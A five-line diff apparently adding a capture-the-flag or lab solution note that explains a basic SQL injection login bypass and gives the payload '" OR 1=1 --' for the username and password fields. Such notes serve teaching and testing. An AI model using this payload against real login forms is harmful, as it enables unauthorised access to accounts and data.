@@ -1,0 +1,5 @@
+This is a basic SQL injection. All we have to do is terminate the string
+and force the query to always evaluate to true.
+
+username: " OR 1=1 --
+password: " OR 1=1 --
